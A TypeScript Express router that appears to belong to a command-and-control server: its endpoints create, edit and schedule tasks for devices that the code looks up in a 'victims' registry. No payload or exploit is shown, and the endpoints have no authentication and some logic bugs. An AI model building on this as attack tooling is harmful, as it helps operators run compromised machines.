import express from 'express';
import * as core from 'express-serve-static-core';
import path from 'path';
import { Config, adjectives, colors, animals, uniqueNamesGenerator } from 'unique-names-generator';
import Task from '../../classes/Task';
import TaskVariable from '../../classes/TaskVariable';
import { saveScheduledTasks, saveTasks, scheduledTasks, tasks, unscheduleTask } from '../../tasksModule';
import Response from '../../classes/Response';
import { checkIfValueInJson } from '../../util/util';
import VariableHolder from '../../classes/VariableHolder';
import ScheduledTask from '../../classes/ScheduledTask';
import victims from '../../victims';

const tasksRouter = express.Router();

tasksRouter.post("/api/createTask", (req, res) => {

    const customConfig: Config = {
        dictionaries: [adjectives, colors, animals],
        separator: '-',
        length: 3,
    };
    var id = uniqueNamesGenerator(customConfig);

    var newTask : Task = {
        "name": id,
        "id": id,
        "content": "",
        variables: new Array<TaskVariable>()
    };

    tasks[newTask.name] = newTask

    saveTasks();

    var responseData: Response = {}
    
    responseData["message"] = "Task created successfully";
    responseData["data"] = {
        "taskID": newTask.name
    }

    res.send(JSON.stringify(responseData))
});

tasksRouter.get("/api/getTasks", (req,res) => {
    var responseData: Response = {}
    
    responseData["message"] = "Tasks returned successfully";
    responseData["data"] = {
        "tasks": tasks
    }

    res.send(JSON.stringify(responseData))
});

tasksRouter.get("/api/getTask", (req, res) => {
    var responseData: Response = {}

    if(!("task-id" in req.headers)){
        responseData["message"] = "Task-ID Not Found in Headers";
        res.status(400);
        res.send(JSON.stringify(responseData));
    } else{
        var taskName: string = req.headers["task-id"] as string
        responseData["message"] = "Task returned successfully";
        responseData["data"] = {
            "task": tasks[taskName]
        }
    
        res.send(JSON.stringify(responseData));
    }
});

tasksRouter.post("/api/deleteTask", (req, res) => {
    if(!("taskID" in req.body)){
        res.status(400);
        var response: Response = {}
        response["message"] = "Malformed Request. No taskID in req body";
        res.send(response);
        return;
    }else{
        delete tasks[req.body["taskID"]];
        saveTasks();
    }

    var responseData: Response = {}
    responseData["message"] = "Task deleted successfully";
    res.send(JSON.stringify(responseData))
});

tasksRouter.post("/api/editTask", (req, res) => {
    if(!("taskID" in req.body)){
        res.status(400);
        var response: Response = {};
        response["message"] = "Malformed Request. No taskID in req body";
        res.send(response);
        return;
    }

    if(!("taskJSON" in req.body)){
        res.status(400);
        var response: Response = {};
        response["message"] = "Malformed Request. No taskJSON in req body";
        res.send(response);
        return;
    }

    tasks[req.body["taskID"]] = req.body["taskJSON"];

    saveTasks();

    var responseData: Response = {}
    responseData["message"] = "Task edited successfully";
    res.send(JSON.stringify(responseData));
});

tasksRouter.post("/api/scheduleTask", (req,res) => {
    var checks: Array<boolean> = [];
    checks.push(checkIfValueInJson(req.body, "scheduleJSON", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "deviceID", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "id", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "name", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "scheduleData", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "type", res));
    var scheduleJSON = req.body["scheduleJSON"]
    if(scheduleJSON["type"] === "Future"){
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "date", res));
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "time", res));
    } else if(scheduleJSON["type"] === "Recurring"){
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "days", res));
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "time", res));
    } else if(scheduleJSON["type"] === "Recurring"){
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "interval", res));
    }

    var variablesHolder: VariableHolder = scheduleJSON["variables"] as VariableHolder;
    for(const x in variablesHolder.vars){
        checks.push(checkIfValueInJson(x, "name", res));
        checks.push(checkIfValueInJson(x, "value", res))
    }
    
    var allGood = true;

    for(let x of checks){
        if(!x){
            allGood = x;
        }
    }
    
    if(allGood){
        var taskToSchedule: ScheduledTask = scheduleJSON as ScheduledTask;
        if(!victims.has(taskToSchedule.deviceID)){
            res.status(400);
            var response: Response = {};
            response["message"] = `Malformed Request. Cannot find device id`;
            res.send(response);
            return;
        }
        scheduledTasks[scheduleJSON["name"]] = taskToSchedule
        var responseData: Response = {}
        responseData["message"] = "Task scheduled successfully";
        res.send(JSON.stringify(responseData));
        saveScheduledTasks();
    }
})

tasksRouter.get("/api/getScheduledTasks", (req,res) => {
    var responseData: Response = {}
    
    responseData["message"] = "Scheduled tasks returned successfully";
    responseData["data"] = {
        "tasks": scheduledTasks
    }

    res.send(JSON.stringify(responseData))
});

tasksRouter.post("/unscheduleTask", (req,res)=> {
    if(!checkIfValueInJson(req.body, "scheduleID", res)){
        return;
    }else{
        unscheduleTask(req.body["scheduleID"]);
    }

    var responseData: Response = {}
    responseData["message"] = "Scheduled task deleted successfully";
    res.send(JSON.stringify(responseData))
});

export default tasksRouter;